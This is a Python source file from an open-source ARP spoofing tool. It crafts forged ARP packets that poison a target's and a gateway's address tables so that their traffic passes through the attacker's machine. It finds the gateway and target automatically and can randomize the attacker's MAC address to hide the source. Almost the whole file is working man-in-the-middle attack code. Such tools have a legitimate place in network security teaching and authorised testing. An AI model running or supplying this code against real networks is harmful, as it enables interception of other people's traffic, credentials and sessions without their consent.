#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

from csv import DictReader
from random import choices, randint
from socket import inet_ntop, socket, AF_INET, AF_PACKET, SOCK_DGRAM, SOCK_RAW
from struct import pack
from time import sleep

from protocols import ARP, Ethernet, Packet


class ARPAttackPackets(object):

    ARP_ETHERTYPE = 0x0806  # IEEE 802.3

    def __init__(self, attacker_mac: str, gateway_ip: str, gateway_mac: str,
                 target_ip: str, target_mac: str):
        self.attacker_mac = attacker_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.payloads = self.payload_to_gateway, self.payload_to_target

    def __iter__(self):
        yield from self.payloads

    @property
    def payload_to_gateway(self):
        gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
                                  eth=self.ARP_ETHERTYPE),
                         ARP(sha=self.attacker_mac, spa=self.target_ip,
                             tha=self.gateway_mac, tpa=self.gateway_ip))
        return gateway.payload

    @property
    def payload_to_target(self):
        target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
                                 eth=self.ARP_ETHERTYPE),
                        ARP(sha=self.attacker_mac, spa=self.gateway_ip,
                            tha=self.target_mac, tpa=self.target_ip))
        return target.payload


class ARPSetupProxy(object):
    """
    Proxy class for ARPAttackPackets.

    Performs a best-effort attempt to query the system and network for
    information necessary to build the ARP attack packets. It allows the
    user to initiate an attack by simply supplying the target's IP
    address. All other required settings are looked up from the
    attacker system's ARP and routing tables and by probing ephemeral
    ports on the target host.
    """

    def __init__(self, interface: str, attacker_mac: str, gateway_mac: str,
                 gateway_ip: str, target_mac: str, target_ip: str,
                 disassociate: bool):
        self.__target_ip = target_ip
        self.__disassociate = disassociate
        self.__net_tables = NetworkingTables()
        self.__gateway_route = self.__get_gateway_route()
        self.interface = self.__set_interface(interface)
        self.__attacker_mac = self.__set_attacker_mac(attacker_mac)
        self.__gateway_ip = self.__set_gateway_ip(gateway_ip)
        self.__gateway_mac = self.__set_gateway_mac(gateway_mac)
        self.__target_mac = self.__set_target_mac(target_mac)
        self.packets = ARPAttackPackets(self.__attacker_mac,
                                        self.__gateway_ip,
                                        self.__gateway_mac,
                                        self.__target_ip,
                                        self.__target_mac)

    def __get_gateway_route(self):
        """Gets a usable route that points to a gateway from the
        routing table. The value 0x0003 is defined at route.h in the
        Linux Kernel userspace API."""
        for route in self.__net_tables.routing_table:
            if int(route['flags']) == 0x0003:
                return route
        raise SystemExit('[!] Unable to find a usable route to the default '
                         'gateway. Check network settings and try again or '
                         'manually set an interface name from which ARP '
                         'packets will be sent with the -i argument.')

    def __set_interface(self, interface: str) -> str:
        if interface is not None:
            return interface
        return self.__gateway_route['interface']

    def __set_gateway_ip(self, gateway_ip: str) -> str:
        """
        Sets the gateway's IP address by converting its standard-sized,
        native byte order hexadecimal representation stored in the
        routing table to a string with the IPv4 address in
        dotted-decimal notation.
        Ex: From 'FE01A8C0' to '192.168.1.254'
        """
        if gateway_ip is not None:
            return gateway_ip
        return inet_ntop(AF_INET,
                         pack("=L", int(self.__gateway_route['gateway'], 16)))

    def __set_gateway_mac(self, gateway_mac: str) -> str:
        if gateway_mac is not None:
            return gateway_mac
        for entry in self.__net_tables.arp_table:
            if entry['ip_address'] == self.__gateway_ip:
                return entry['hw_address']

    def __set_target_mac(self, mac_addr: str) -> str:
        """
        Sets the target's MAC address by sending it UDP datagrams with
        empty byte strings to random ports contained in the ephemeral
        port range (IETF RFC 6335) and then looking up its registered
        MAC address in the attacker's ARP table.
        """
        if mac_addr is not None:
            return mac_addr
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while True:
                for entry in self.__net_tables.arp_table:
                    if entry['ip_address'] == self.__target_ip:
                        return entry['hw_address']
                sock.sendto(b'', (self.__target_ip, randint(49152, 65535)))
                sleep(2)

    def __set_attacker_mac(self, mac_addr: str) -> str:
        """
        Sets the attacker's MAC address to a random IEEE 802 compliant
        address if 'disassociate' is set to True or queries the system
        for the interface's address by temporarily binding to it.
        """
        if mac_addr is not None:
            return mac_addr
        if self.__disassociate is True:
            return self.__randomize_mac_addr()
        with socket(AF_PACKET, SOCK_RAW) as sock:
            sock.bind((self.interface, 0))
            mac_address: bytes = sock.getsockname()[4]
        return self.__bytes_to_mac_addr(mac_address)

    @staticmethod
    def __randomize_mac_addr() -> str:
        hex_values = '0123456789ABCDEF'
        return ':'.join(''.join(choices(hex_values, k=2)) for _ in range(6))

    @staticmethod
    def __bytes_to_mac_addr(addr: bytes) -> str:
        """
        Converts a byte-string of length 6 bytes to IEEE 802 MAC address.
        Ex: From b'\xceP\x9a\xcc\x8c\x9d' to 'ce:50:9a:cc:8c:9d'
        """
        return ':'.join(format(octet, '02x') for octet in addr)


class NetworkingTables(object):
    @staticmethod
    def __parse_networking_table(path: str, header: tuple, delimiter: str):
        with open(path, 'r', encoding='utf_8') as table:
            settings = DictReader(table, fieldnames=header,
                                  skipinitialspace=True, delimiter=delimiter)
            next(settings)  # Skip table header line
            yield from (line for line in settings)

    @property
    def arp_table(self, arp_table_path: str = '/proc/net/arp'):
        headers = ('ip_address', 'hw_type', 'flags', 'hw_address', 'mask',
                   'device')
        return self.__parse_networking_table(path=arp_table_path,
                                             header=headers,
                                             delimiter=' ')

    @property
    def routing_table(self, routing_table_path: str = '/proc/net/route'):
        headers = ('interface', 'destination', 'gateway', 'flags', 'ref_cnt',
                   'use', 'metric', 'mask', 'mtu', 'window', 'irtt')
        return self.__parse_networking_table(path=routing_table_path,
                                             header=headers,
                                             delimiter='\t')
